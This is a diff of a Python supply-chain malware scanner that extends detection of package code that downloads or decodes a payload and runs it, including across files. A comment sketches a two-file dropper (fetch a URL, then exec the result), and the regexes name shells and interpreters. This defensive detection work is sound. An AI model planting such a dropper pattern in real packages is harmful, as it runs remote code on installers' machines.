+        text = _DL_MEMBER_RE.sub(lambda m: ("." + (m.group("a") or m.group("b"))).ljust(len(m.group())), text)
+    return text
+
+
+def _dl_callbacks(text, runners=()):
+    """`text` with each code runner handed to a call as its last argument
+    (see above) — and each of `runners`, a function of another file of the
+    package that runs its argument (the cross-file follower's) — read as the
+    call it makes: (_v)=>eval(_v). Its row gets longer; its line is the same."""
+    if ")" not in text:
+        return text
+    if any(n in text for n in _DL_CALLBACK_NEEDLES):
+        text = _DL_CALLBACK_RE.sub(lambda m: "(_v)=>" + _DL_SPACE_RE_ANY.sub("", m.group("r")) + "(_v)", text)
+    names = [n for n in runners if n in text]
+    if names:
+        rx = re.compile(_DL_RUNNER_ARG_HEAD + "|".join(re.escape(n) for n in sorted(names)) + _DL_RUNNER_ARG_TAIL)
+        text = rx.sub(lambda m: "(_v)=>" + m.group("r") + "(_v)", text)
+    return text
+
+
+def _dl_logical(text, runners=()):
+    """(alt, firsts): the second reading's text (see above) — statements
+    joined, environment variables and members read as names, (0, f)(…) as
+    f(…), each padded to the length it replaces, and a runner handed to a
+    call as the call it makes — and _dl_join_rows' firsts."""
+    joined, firsts = _dl_join_rows(text)
+    return _dl_comma_calls(_dl_callbacks(_dl_members(_dl_env_canonical(joined)), runners)), firsts
 
 
 def _dl_lhs_names(lhs):
@@ -7177,7 +8653,7 @@ class _DlNamed:
         if self.index is None and self.searches < _DL_NAMED_SEARCHES:
             self.searches += 1
             esc = re.escape(head)
-            rx = re.compile(esc + r"(?<![\w$]" + esc + r")(?![\w$])")
+            rx = re.compile(esc + _DL_NAMED_MID + esc + _DL_NAMED_TAIL)
             out, text, starts = [], self.text, self.starts
             m = rx.search(text)
             while m is not None:
@@ -7282,14 +8758,15 @@ class _DlRow:
         self.phases.append(ph)
         return ph
 
-    def runs(self, r, taint):
+    def runs(self, r, taint, alias=False):
         """Is the runner call `r` handed a received value (taint None: a
         download only) — as an argument, or written into an interpreter's
-        command line?"""
+        command line? (`alias`: a call of a runner alias, which runs code
+        whatever its name — a `run` alias is not subprocess.run.)"""
         row, k = self.row, self.k
         if _dl_defined_here(row, r.start()):
             return False                                # def exec(…), function exec(…)
-        if _DL_SHELL_CALL_RE.fullmatch(r.group()) and not self.reader.shell_within(k, row, r.end()):
+        if not alias and _DL_SHELL_CALL_RE.fullmatch(r.group()) and not self.reader.shell_within(k, row, r.end()):
             return False                                # run(…) without shell=True
         o = r.end() - 1
         if o >= self.hi:
@@ -7468,7 +8945,7 @@ class _DlReader:
                     return cat
         if self.alias_call is not None:                   # a call of a runner alias near its definition
             for r in self.alias_call.finditer(row):
-                if _dl_alias_near(self.aliases[r.group(1)], k) and rd.runs(r, taint):
+                if _dl_alias_near(self.aliases[r.group(1)], k) and rd.runs(r, taint, alias=True):
                     return "run"
         return None
 
@@ -7571,26 +9048,49 @@ def _dl_runner_aliases(rows):
 
 
 def _dl_alias_near(def_rows, k):
-    """Is a definition row at or within _DL_WINDOW rows above k?"""
+    """Is a definition row at or within _DL_WINDOW rows above k? (None: a
+    runner of another file of the package, a runner everywhere.)"""
+    if def_rows is None:
+        return True
     i = bisect.bisect_right(def_rows, k) - 1
     return i >= 0 and k - def_rows[i] <= _DL_WINDOW
 
 
-def _received_code_kind(text, extra_always=()):
+def _received_code_kind(text, extra_always=(), extra_runners=()):
     """(1-based line, category) for the first place code runs, deserializes or
     imports a value it received over the network (see runs_received_code), or
     None. Category is 'run', 'deserialize' or 'import'.
 
     extra_always: names known from another file of the same package to hold or
-    return a received value (the Python-only cross-file follower,
+    return a received value (the cross-file follower,
     _cross_file_received_issues). They are seeded exactly like this file's own
-    network-module import names, so a sink that runs one fires. Empty by
-    default, so single-file behaviour — and the npm twin, which never passes it
-    — is unchanged, and the parity corpus still agrees."""
-    if not any(n in text for n in _DL_SINK_NEEDLES):
+    network-module import names, so a sink that runs one fires. extra_runners:
+    names of another file's functions that run their argument as code (the
+    follower's too): a call of one is a runner, like a runner alias defined
+    anywhere. Both empty by default, so single-file behaviour is unchanged.
+
+    The text is read a second time with its multi-row statements joined, its
+    environment variables and members read as names and a runner handed to a
+    call read as the call it makes (_dl_logical) when the first reading finds
+    nothing; the line is then the one the statement starts on."""
+    if not extra_runners and not any(n in text for n in _DL_SINK_NEEDLES):
         return None
     if not extra_always and not any(n in text for n in _DL_NEEDLES):
         return None
+    res = _dl_kind(text, extra_always, extra_runners)
+    if res is not None or len(text) > _DL_LOGICAL_MAX_CHARS:
+        return res
+    alt, firsts = _dl_logical(text, extra_runners)
+    if alt == text:
+        return None
+    res = _dl_kind(alt, extra_always, extra_runners)
+    if res is None:
+        return None
+    return (res[0] if firsts is None else firsts[res[0] - 1] + 1), res[1]
+
+
+def _dl_kind(text, extra_always, extra_runners=()):
+    """_received_code_kind's reading of `text` (its gates passed)."""
     rows = text.split("\n")
     starts, at = [], 0
     for row in rows:
@@ -7615,9 +9115,12 @@ def _received_code_kind(text, extra_always=()):
         for r in named.find(name):
             seeds[r] = 1
     aliases = _dl_runner_aliases(rows) if any(nd in text for nd in _DL_ALIAS_NEEDLES) else {}
+    for name in extra_runners:                          # another file's runner: a runner everywhere here
+        aliases[name] = None
     alias_call = None
     if aliases:                                         # a call of a runner alias, near its definition, is a runner
-        alias_call = re.compile(r"""(?<![\w$.])(""" + "|".join(re.escape(n) for n in sorted(aliases)) + r""")\s*\(""")
+        alias_call = re.compile(_DL_ALIAS_CALL_HEAD + "|".join(re.escape(n) for n in sorted(aliases))
+                                + _DL_ALIAS_CALL_TAIL)
         for name, def_rows in aliases.items():
             for r in named.find(name):
                 seeds[r] = 1
@@ -7679,8 +9182,9 @@ def runs_received_code(text):
 # a received value written to a file, naming the path (a download-to-file API,
 # or a write whose window holds a source); the run of that path is the opener
 # of an interpreter/exec/require/import/subprocess call. Both patterns and the
-# path-token grammar are in the spec (p4, urlretrieve, is a download-to-file on
-# its own and needs no separate source).
+# path-token grammar are in the spec (p4, urlretrieve, and p5, curl or wget
+# given `-o path` in an argument list, 0.1.8, are a download to a file on
+# their own and need no separate source).
 _DL_FILE_WRITE_RE = _dl_re("_DL_FILE_WRITE_RE")
 _DL_FILE_WRITE_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_FILE_WRITE_NEEDLES"])
 _DL_PATHRUN_SINK_RE = _dl_re("_DL_PATHRUN_SINK_RE")
@@ -7718,28 +9222,99 @@ def _downloads_and_runs_file(text):
     """The 1-based line where a received value is written to a file that is then
     run (see the section comment), else None. MAJOR only, except in the Python
     code pip runs to install an sdist (the registry)."""
+    res = _downloads_and_runs(text)
+    return None if res is None else res[0]
+
+
+# The shell or interpreter a written file is run with (0.1.8). A script a
+# shell or an interpreter runs — subprocess.run(['/bin/bash', path]),
+# spawn('node', [path]), os.system('sh ' + path), require(path) — is a
+# download piped into a shell in two steps, and is CRITICAL wherever it is
+# found (ptmpl's post_install.py downloaded a .sh, made it executable and ran
+# it with bash). A file run on its own (a binary, started by its path) keeps
+# the MAJOR shape a prebuilt binary's installer shares, and so does one
+# require()d: a native addon (.node) is loaded that way.
+_SCRIPT_INTERP_RE = re.compile(
+    r"""(?:^|(?<=[\s\[(,'"`/\\]))(?P<name>bash|sh|zsh|dash|ksh|node|nodejs|deno|bun|pwsh|powershell|perl|ruby"""
+    r"""|php|osascript|cscript|wscript)(?:\.exe)?(?=['"`\s,\])])""")
+_SCRIPT_LOAD_RE = re.compile(r"""\b(?P<fork>fork)\s*\(|\b(?:execfile|run_path)\s*\(|(?<![\w$.])exec\s*\(\s*open\s*\(""")
+
+
+def _dl_run_interp(row):
+    """The shell or interpreter the run on `row` uses, else None: a named
+    one, node for child_process.fork (which runs a module with Node.js), or
+    Python for execfile / runpy.run_path / exec(open(…))."""
+    m = _SCRIPT_INTERP_RE.search(row)
+    if m is not None:
+        return m.group("name")
+    m = _SCRIPT_LOAD_RE.search(row)
+    if m is None:
+        return None
+    return "node" if m.group("fork") else "Python"
+
+
+def _dl_written_and_run(rows, is_src, downloads):
+    """The row index that runs a file written in the window of a row for
+    which is_src(row) holds, else None. `downloads`: urlretrieve, a download
+    to a file on its own, counts without a source row. (The source rows are
+    looked for only around a write: a bundle has few writes and 80,000 rows.)"""
+    known = {}
+
+    def src(j):
+        got = known.get(j)
+        if got is None:
+            got = known[j] = len(rows[j]) <= _DL_LONG_ROW and is_src(rows[j])
+        return got
+
+    n = len(rows)
+    for k, row in enumerate(rows):
+        if len(row) > _DL_LONG_ROW or not any(n_ in row for n_ in _DL_FILE_WRITE_NEEDLES):
+            continue
+        near_src = None
+        for wm in _DL_FILE_WRITE_RE.finditer(row):
+            if wm.group("p4") is None and wm.group("p5") is None:
+                if near_src is None:
+                    near_src = any(src(j) for j in range(max(0, k - _DL_WINDOW), min(n, k + _DL_WINDOW + 1)))
+                if not near_src:
+                    continue                             # a plain write needs a source in its window
+            elif not downloads:
+                continue
+            path = _dl_path_token(wm)
+            if not path:
+                continue
+            hit = _dl_pathrun_after(rows, k, path)
+            if hit is not None:
+                return hit
+    return None
+
+
+def _downloads_and_runs(text):
+    """(line, interpreter or None): where a received value is written to a
+    file that is then run (see the section comment), and the shell or
+    interpreter that runs it (_dl_run_interp); None when there is none."""
     if (not any(n in text for n in _DL_NEEDLES) or not any(n in text for n in _DL_FILE_WRITE_NEEDLES)
             or not any(n in text for n in _DL_PATHRUN_NEEDLES)):
         return None
     rows = text.split("\n")
     # rows holding a network source (a plain write must be near a real download;
     # urlretrieve is a download-to-file on its own)
-    src = sorted(k for k, row in enumerate(rows)
-                 if len(row) <= _DL_LONG_ROW and next(_dl_finditer(_DL_SOURCE, row), None) is not None)
-    for k, row in enumerate(rows):
-        if len(row) > _DL_LONG_ROW or not any(n in row for n in _DL_FILE_WRITE_NEEDLES):
-            continue
-        near_src = _dl_any(src, k - _DL_WINDOW, k + _DL_WINDOW + 1)
-        for wm in _DL_FILE_WRITE_RE.finditer(row):
-            if wm.group("p4") is None and not near_src:
-                continue                                 # a plain write needs a download in its window
-            path = _dl_path_token(wm)
-            if not path:
-                continue
-            hit = _dl_pathrun_after(rows, k, path)
-            if hit is not None:
-                return hit + 1
-    return None
+    hit = _dl_written_and_run(rows, lambda row: next(_dl_finditer(_DL_SOURCE, row), None) is not None, True)
+    return None if hit is None else (hit + 1, _dl_run_interp(rows[hit]))
+
+
+def _decodes_and_runs(text):
+    """(line, interpreter or None) where a value the file decodes — a decode
+    call (_DECODE_CALL_RE: b64decode, atob, Buffer.from(…, 'base64'),
+    fromhex, unhexlify, zlib.decompress, a cipher's decrypt) in the window
+    of a file write — is written to that file and the file is then run,
+    else None. litellm 1.82.7's proxy_server.py wrote a base64 payload to
+    p.py and ran it with sys.executable when the proxy was imported."""
+    if (not any(n in text for n in _DL_FILE_WRITE_NEEDLES) or not any(n in text for n in _DL_PATHRUN_NEEDLES)
+            or _DECODE_CALL_RE.search(text) is None):
+        return None
+    rows = text.split("\n")
+    hit = _dl_written_and_run(rows, lambda row: _DECODE_CALL_RE.search(row) is not None, False)
+    return None if hit is None else (hit + 1, _dl_run_interp(rows[hit]))
 
 
 def _dl_pathrun_after(rows, k, path):
@@ -8300,6 +9875,7 @@ import traceback as _traceback
 import urllib.parse as _urlparse
 
 import lazaret as _lazaret_pkg   # __version__ (the package root imports nothing)
+VERSION = _lazaret_pkg.__version__     # what every command's --version prints
 
 # ---------------- File collection (the project walk) ----------------
 # The walk is the attack surface a hostile repository controls completely, so:
@@ -9205,27 +10781,57 @@ class _DependencyTree:
         return next((c for c in candidates[6:] if self.is_file(c)), None)
 
 
-# ---------------- Cross-file received code (Python engine only) ----------------
-# A dropper can split the network source and the code-runner across two files of
+# ---------------- Cross-file received code (both engines since 0.1.8) ----------------
+# A dropper can split the network source and the code-runner across files of
 # one package, so neither file alone trips the single-file detector:
 #     _net.py:      def pull(): return requests.get(URL).text
 #     __init__.py:  from ._net import pull; exec(pull())
-# This follower runs only in the Python engine, over a package's own dependency
-# files, and is deliberately kept out of the twinned flow.py: the npm engine
-# stays single-file with an honest gate. Per package it collects each module's
-# TAINTED EXPORTS — a module-level name that holds, or a function that returns, a
-# value received over the network — resolves a sibling module's import of one,
-# then re-runs the single-file detector with that name seeded (extra_always). It
-# fires only when the value genuinely came from another file, at the single-file
-# severity (SC-IMPORT-RISK, MAJOR, never escalating an install hook). Bounded:
-# one pass per file, exports followed one hop, within one package.
-
-# Bounds for the cross-file pass — tighter than the single-file detector's, and
-# hard caps so a huge package can never blow up.
-_XF_WINDOW = 25                 # rows of a function / method body scanned for a source
-_XF_MAX_FILES = 3000            # dependency files per package the follower groups
-_XF_MAX_EXPORTS = 256           # tainted export names tracked per module
+# The follower reads a package's own files (a Python top-level package, or an
+# npm package) as modules: what each defines (functions, values, classes and
+# their methods and attributes, static or not, and object literals, whose
+# members are read like a class's static ones), imports (a name, a module, a
+# default; import_module, __import__ and import() by a literal name, and
+# require(path.join(__dirname, …))) and exports (npm: module.exports and its
+# object literal, exports.x and exports['x'], export …, export default {…},
+# the re-exports export … from, export * from, module.exports = require(…),
+# and TypeScript's Object.defineProperty(exports, …) getters and
+# exports.default), and the environment variables it sets. A symbol holds a
+# received value when what it returns or is assigned carries a network
+# source, or names a symbol that holds one — through a wrapper, a re-export,
+# a class method (self.x / this.x), up to _XF_ROUNDS hops — or when its body
+# receives one and hands it to a callback: a parameter it calls, or a
+# Promise's resolve. A write into a module-level name (CACHE['c'] = …,
+# cache.code = …) or an instance's own (self.data = …) is read like an
+# assignment of it. Each module is then read by the single-file detector
+# with the names that hold a received value in it seeded (extra_always): a
+# function or value imported by name, a module's members (m.pull,
+# pkg._net.pull), a class's static members (C.pull, api.pull) and an
+# instance's (c = C(); c.pull(), self.c = C(); self.c.pull(), new ns.C(),
+# C().pull() read as one name), and an environment variable another file set
+# to a received value. The other way round, a function of the package that
+# runs its parameter as code (def execute(c): exec(c)) is a runner in every
+# file that imports it (extra_runners): the value is received there and run
+# by the other file's function.
+# It fires only when the flow crosses files — a file whose own text shows it
+# is the single-file test's — at the single-file severity (SC-IMPORT-RISK,
+# CRITICAL for running what was received); comments and docstrings are read
+# out first (a usage example is not code). Export detection is liberal (a
+# function that fetches and returns is an export an HTTP library has too);
+# the finding stays precise because it needs the value to be run.
+# Bounded: _XF_MAX_FILES files and _XF_MAX_SYMBOLS symbols per package, a
+# body read for _XF_WINDOW rows, an object literal for _XF_OBJECT_ROWS,
+# _XF_MAX_SEEDS seeds per file, _XF_MAX_RUNNERS functions tested for running
+# a parameter.
+_XF_WINDOW = 25                 # rows of a function / method body read
+_XF_MAX_FILES = 3000            # files per package the follower groups
 _XF_MAX_SEEDS = 64              # cross-file seeds fed into one file
+_XF_ROUNDS = 4                  # hops followed through wrappers and re-exports
+_XF_MAX_SYMBOLS = 5000          # symbols per package
+_XF_MAX_DEPTH = 8               # re-exports followed to what they name
+_XF_LOCAL_DEPTH = 3             # a body's locals followed to its return
+_XF_OBJECT_ROWS = 400           # rows of an object literal read for its members
+_XF_MAX_RUNNERS = 200           # functions per package tested for running a parameter
+_XF_MAX_CHARS = 2_000_000       # a longer file (a bundle) is not read for what it defines
 
 _XF_CLASS_RE = re.compile(r"^[ \t]*class[ \t]+(?P<name>[A-Za-z_]\w*)")
 _XF_DEF_RE = re.compile(r"^[ \t]*(?:async[ \t]+)?def[ \t]+(?P<name>[A-Za-z_]\w*)[ \t]*\(")
@@ -9233,7 +10839,114 @@ _XF_ASSIGN_RE = re.compile(r"^(?P<indent>[ \t]*)(?P<name>[A-Za-z_]\w*)[ \t]*=(?!
 _XF_RETURN_RE = re.compile(r"^[ \t]*return[ \t](?P<expr>.*)$")
 _XF_FROM_RE = re.compile(
     r"^[ \t]*from[ \t]+(?P<mod>\.+[\w.]*|[\w.]+)[ \t]+import[ \t]+(?P<names>\*|\([^()]*\)|.+?)[ \t]*$", re.M)
+_XF_IMPORT_RE = re.compile(r"^[ \t]*import[ \t]+(?P<names>[\w.]+(?:[ \t]+as[ \t]+\w+)?(?:[ \t]*,[ \t]*[\w.]+"
+                           r"(?:[ \t]+as[ \t]+\w+)?)*)[ \t]*$", re.M)
+_XF_STATIC_RE = re.compile(r"^[ \t]*@(?:staticmethod|classmethod)\b")
+_XF_DEF_END_RE = re.compile(r"\)[^():\n]*:")
+_XF_PY_ENV_WRITE_RE = re.compile(
+    r"\b(?:os[ \t]*\.[ \t]*)?environ[ \t]*\[[ \t]*['\"](?P<var>[A-Za-z_][A-Za-z0-9_]{0,63})['\"][ \t]*\][ \t]*=(?!=)"
+    r"(?P<rhs>[^\n]*)")
+_XF_PY_DYN_IMPORT_RE = re.compile(
+    r"(?<![\w$.])(?P<local>[A-Za-z_]\w*)[ \t]*=[ \t]*(?:importlib[ \t]*\.[ \t]*)?(?P<fn>import_module|__import__)"
+    r"[ \t]*\([ \t]*['\"](?P<mod>\.{0,8}[A-Za-z_][\w.]{0,200})['\"](?P<rest>[^\n]*)")
 _XF_DEP_MARKERS = ("site-packages", "dist-packages", "vendor")
+# a write into a name's member: CACHE['c'] = …, cache.code = …, self.data = …
+_XF_MEMBER_WRITE_RE = re.compile(
+    r"(?<![\w$.])(?P<name>[A-Za-z_$][\w$]*)[ \t]*(?:\[[^\]\n]*\]|\.[ \t]*(?P<attr>[A-Za-z_$][\w$]*))[ \t]*=(?![=>])"
+    r"[ \t]*(?P<rhs>[^;\n]*)")
+# a function's parameters, and a body handing what it receives to one (or to a Promise's resolve)
+_XF_PARAMS_RE = re.compile(r"\((?P<params>[^()]*)\)")
+_XF_PARAM_NAME_RE = re.compile(r"[ \t]*(?:\*{1,2}|\.\.\.)?[ \t]*(?P<name>[A-Za-z_$][\w$]*)")
+_XF_ARROW_ONE_RE = re.compile(r"[ \t]*(?:async[ \t]+)?(?P<name>[A-Za-z_$][\w$]*)[ \t]*=>")
+_XF_PROMISE_RE = re.compile(
+    r"\bnew[ \t]+Promise[ \t]*\([ \t]*(?:async[ \t]+)?(?:function\b[^(\n]*\([ \t]*|\([ \t]*)?(?P<name>[A-Za-z_$][\w$]*)")
+_XF_CALL_NAME_RE = re.compile(r"(?<![\w$.])(?P<name>[A-Za-z_$][\w$]*)[ \t]*\(")
+_XF_NOT_PARAMS = frozenset({"self", "cls", "this", "async"})
+
+_XF_JS_FUNC_RE = re.compile(r"\bfunction[ \t]*\*?[ \t]*(?P<name>[A-Za-z_$][\w$]*)[ \t]*\(")
+_XF_JS_CONST_RE = re.compile(r"\b(?:const|let|var)[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*=(?![=>])[ \t]*(?P<rhs>.*)$")
+_XF_JS_FN_VALUE_RE = re.compile(r"(?:async[ \t]+)?(?:function\b[^(]*\(|\([^()]*\)[ \t]*=>|[A-Za-z_$][\w$]*[ \t]*=>)")
+_XF_JS_CLASS_RE = re.compile(r"\bclass[ \t]+(?P<name>[A-Za-z_$][\w$]*)")
+# a class method's header: `pull(args) {`, `static async pull(args) {`, `*g(){`, `get x() {`
+_XF_JS_METHOD_RE = re.compile(
+    r"(?:^|[ \t;{}])(?P<static>static[ \t]+)?(?:async[ \t]+)?(?:\*[ \t]*)?(?:(?:get|set)[ \t]+)?"
+    r"(?P<name>[A-Za-z_$][\w$]*)[ \t]*\([^()]*\)[ \t]*\{")
+# a class field, at the class body's own level: `static data = …`, `data = …`
+_XF_JS_FIELD_RE = re.compile(r"^[ \t]*(?P<static>static[ \t]+)?(?P<name>[A-Za-z_$][\w$]*)[ \t]*=(?![=>])[ \t]*"
+                             r"(?P<rhs>[^;\n]*)")
+_XF_JS_KEYWORDS = frozenset({"if", "for", "while", "switch", "catch", "function", "return", "do", "else",
+                             "with", "constructor", "class"})
+_XF_JS_OBJECT_WORDS = ("const", "let", "var", "module", "export")      # what _XF_JS_OBJECT_RE needs
+_XF_JS_RETURN_RE = re.compile(r"\breturn\b[ \t]*(?P<expr>[^;\n]*)")
+_XF_JS_LOCAL_RE = re.compile(r"(?<![\w$.])(?:(?:const|let|var)[ \t]+)?(?P<name>[A-Za-z_$][\w$]*)[ \t]*=(?![=>])"
+                             r"[ \t]*(?P<rhs>[^;\n]*)")
+# an object literal whose members are read: const api = {…}, module.exports = {…}, export default {…}
+_XF_JS_OBJECT_RE = re.compile(
+    r"(?:\b(?:const|let|var)[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*=|\bmodule[ \t]*\.[ \t]*exports[ \t]*="
+    r"|\bexport[ \t]+default)[ \t]*\{")
+_XF_JS_MEMBER_RE = re.compile(
+    r"(?:async[ \t]+(?=[*A-Za-z_$'\"]))?(?:\*[ \t]*)?(?:(?:get|set)[ \t]+(?=[A-Za-z_$'\"]))?['\"]?"
+    r"(?P<name>[A-Za-z_$][\w$]*)['\"]?[ \t]*(?:(?P<method>\()|(?P<colon>:)|(?=[,}]|$))")
+_XF_JS_EXPORT_DECL_RE = re.compile(
+    r"\bexport[ \t]+(?:async[ \t]+)?(?:function[ \t]*\*?[ \t]*|(?:const|let|var)[ \t]+|class[ \t]+)"
+    r"(?P<name>[A-Za-z_$][\w$]*)")
+_XF_JS_EXPORT_DEFAULT_DECL_RE = re.compile(
+    r"\bexport[ \t]+default[ \t]+(?:async[ \t]+)?(?:function\b[ \t]*\*?[ \t]*(?P<fn>[A-Za-z_$][\w$]*)?"
+    r"|class\b[ \t]*(?P<cls>[A-Za-z_$][\w$]*)?)")
+_XF_JS_EXPORT_LIST_RE = re.compile(r"\bexport[ \t]*\{(?P<names>[^{}]*)\}(?![ \t]*from\b)")
+_XF_JS_EXPORT_FROM_RE = re.compile(r"\bexport[ \t]*\{(?P<names>[^{}]*)\}[ \t]*from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
+_XF_JS_EXPORT_STAR_RE = re.compile(
+    r"\bexport[ \t]*\*[ \t]*(?:as[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*)?from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
+_XF_JS_EXPORT_DEFAULT_RE = re.compile(r"\bexport[ \t]+default[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*;?[ \t]*$", re.M)
+_XF_JS_MODEXP_OBJ_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*\{(?P<names>[^{}]*)\}")
+_XF_JS_MODEXP_PROP_RE = re.compile(
+    r"\b(?:module\s*\.\s*exports|exports)\s*(?:\.\s*(?P<name>[A-Za-z_$][\w$]*)|\[\s*['\"](?P<qname>[A-Za-z_$][\w$]*)"
+    r"['\"]\s*\])[ \t]*=(?![=>])[ \t]*(?P<rhs>[^\n]*)")
+_XF_JS_MODEXP_ALL_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*(?P<name>[A-Za-z_$][\w$]*)[ \t]*;?[ \t]*$", re.M)
+_XF_JS_MODEXP_CLASS_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*class[ \t]+(?P<name>[A-Za-z_$][\w$]*)")
+_XF_JS_MODEXP_REQ_RE = re.compile(r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*require\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"][ \t]*\)")
+_XF_JS_MODEXP_FN_RE = re.compile(
+    r"\bmodule\s*\.\s*exports[ \t]*=[ \t]*(?=(?:async[ \t]+)?(?:function\b|\([^()]*\)[ \t]*=>|[A-Za-z_$][\w$]*[ \t]*=>))")
+_XF_JS_DEFINE_RE = re.compile(
+    r"\bObject\s*\.\s*defineProperty\(\s*exports\s*,\s*['\"](?P<name>[A-Za-z_$][\w$]*)['\"]\s*,\s*\{[^{}]*?\bget\s*:"
+    r"\s*function\s*\(\s*\)\s*\{\s*return\s+(?P<ref>[A-Za-z_$][\w$]*(?:\s*\.\s*[A-Za-z_$][\w$]*)*)")
+_XF_JS_REQ_DESTR_RE = re.compile(
+    r"\b(?:const|let|var)[ \t]*\{(?P<names>[^{}]*)\}[ \t]*=[ \t]*require\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"][ \t]*\)")
+# (TypeScript's and Babel's interop helpers wrap the require: __importDefault(require("./x")))
+_XF_JS_REQ_NS_RE = re.compile(
+    r"\b(?:const|let|var)[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*(?:(?:__importDefault|__importStar"
+    r"|_interopRequireDefault|_interopRequireWildcard)[ \t]*\([ \t]*)?require\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"]"
+    r"[ \t]*\)(?![ \t]*\.)")
+_XF_JS_REQ_MEMBER_RE = re.compile(
+    r"\b(?:const|let|var)[ \t]+(?P<local>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*require\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"][ \t]*\)"
+    r"[ \t]*\.[ \t]*(?P<name>[A-Za-z_$][\w$]*)")
+_XF_JS_IMP_NAMED_RE = re.compile(
+    r"\bimport[ \t]*(?:[A-Za-z_$][\w$]*[ \t]*,[ \t]*)?\{(?P<names>[^{}]*)\}[ \t]*from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
+_XF_JS_IMP_NS_RE = re.compile(
+    r"\bimport[ \t]*\*[ \t]*as[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
+_XF_JS_IMP_DEFAULT_RE = re.compile(
+    r"\bimport[ \t]+(?P<name>[A-Za-z_$][\w$]*)[ \t]*(?:,[ \t]*\{[^{}]*\})?[ \t]*from[ \t]*['\"](?P<mod>[^'\"\n]+)['\"]")
+_XF_JS_DYN_DESTR_RE = re.compile(
+    r"\b(?:const|let|var)[ \t]*\{(?P<names>[^{}]*)\}[ \t]*=[ \t]*(?:await[ \t]+)?import\([ \t]*['\"](?P<mod>[^'\"\n]+)['\"]"
+    r"[ \t]*\)")
+_XF_JS_DYN_NS_RE = re.compile(
+    r"\b(?:const|let|var)[ \t]+(?P<ns>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*(?:await[ \t]+)?import\([ \t]*['\"](?P<mod>[^'\"\n]+)"
+    r"['\"][ \t]*\)")
+# a path built from the module's own directory: path.join(__dirname, 'x'), __dirname + '/x', `${__dirname}/x`
+_XF_JS_DIRNAME_RE = re.compile(
+    r"(?<![\w$])(?:path[ \t]*\.[ \t]*)?(?:join|resolve)[ \t]*\([ \t]*__dirname[ \t]*,[ \t]*['\"](?P<a>[^'\"\n]*)['\"][ \t]*\)"
+    r"|(?<![\w$.])__dirname[ \t]*\+[ \t]*['\"](?P<b>/[^'\"\n]*)['\"]"
+    r"|`\$\{__dirname\}(?P<c>/[^`$\n]*)`")
+_XF_JS_ENV_WRITE_RE = re.compile(
+    r"\bprocess\s*\.\s*env\s*(?:\.\s*(?P<a>[A-Za-z_$][\w$]*)|\[\s*['\"`](?P<b>[A-Za-z_$][\w$]*)['\"`]\s*\])\s*=(?![=>])"
+    r"(?P<rhs>[^\n]*)")
+_XF_SPACE_RE = re.compile(r"\s+")
+_XF_BRACE_RE = re.compile(r"[{}]")
+_XF_JS_LINE_COMMENT_RE = re.compile(r"(?:^|(?<=[\s;,(){}]))//")
+
+
+_XF_PY_QUOTE_RE = re.compile(r"[#'\"]")
+_XF_PY_BODY_RE = {q: re.compile(r"(?:[^\\" + q + r"]|\\.)*") for q in ("'", '"')}
 
 
 def _xf_py_mask(text):
@@ -9243,114 +10956,1008 @@ def _xf_py_mask(text):
     libraries carry (`requests.get(...)` in a docstring is not an export). A
     robustness heuristic, not a full tokenizer: escapes and string prefixes need
     not be exact, because over- or under-masking only shifts the (sink-gated)
-    export approximation, never a finding on its own."""
+    export approximation, never a finding on its own. Rows keep their length.
+    (A row is searched from quote to quote: character by character, litellm's
+    2,400 modules took 13 s.)"""
     out, delim = [], None
     for row in text.split("\n"):
-        chars, i, n = [], 0, len(row)
+        n = len(row)
+        if delim is None and "#" not in row and "'" not in row and '"' not in row:
+            out.append(row)
+            continue
+        parts, i = [], 0
         if delim is not None:                       # inside a triple-quoted string
             end = row.find(delim)
             if end < 0:
-                out.append("")
+                out.append(" " * n)
                 continue
             i = end + 3
-            chars.append(" " * i)
+            parts.append(" " * i)
             delim = None
         while i < n:
-            ch = row[i]
+            m = _XF_PY_QUOTE_RE.search(row, i)
+            if m is None:
+                parts.append(row[i:])
+                break
+            j = m.start()
+            parts.append(row[i:j])
+            ch = row[j]
             if ch == "#":
+                parts.append(" " * (n - j))
                 break                               # comment to end of line
-            three = row[i:i + 3]
+            three = row[j:j + 3]
             if three == "'''" or three == '"""':
-                end = row.find(three, i + 3)
+                end = row.find(three, j + 3)
                 if end < 0:
-                    chars.append(" " * (n - i))
+                    parts.append(" " * (n - j))
                     delim = three
-                    i = n
                     break
-                chars.append(" " * (end + 3 - i))
+                parts.append(" " * (end + 3 - j))
                 i = end + 3
                 continue
-            if ch == "'" or ch == '"':
-                j = i + 1
-                while j < n and row[j] != ch:
-                    j += 2 if row[j] == "\\" else 1
-                chars.append(ch + " " * max(0, min(j, n) - i - 1) + (ch if j < n else ""))
-                i = j + 1
-                continue
-            chars.append(ch)
-            i += 1
-        out.append("".join(chars))
+            k = _XF_PY_BODY_RE[ch].match(row, j + 1).end()     # to the closing quote, a backslash escaping
+            if k < n and row[k] == ch:
+                parts.append(ch + " " * (k - j - 1) + ch)
+                i = k + 1
+            else:                                   # unterminated: to the end of the row
+                parts.append(ch + " " * (n - j - 1))
+                break
+        out.append("".join(parts))
     return out
 
 
-def _xf_expr_carries(expr, tainted):
-    """Does `expr` hold a received value — a network source, or a name in
-    `tainted` used as the head of a member chain?"""
-    if next(_dl_finditer(_DL_SOURCE, expr), None) is not None:
-        return True
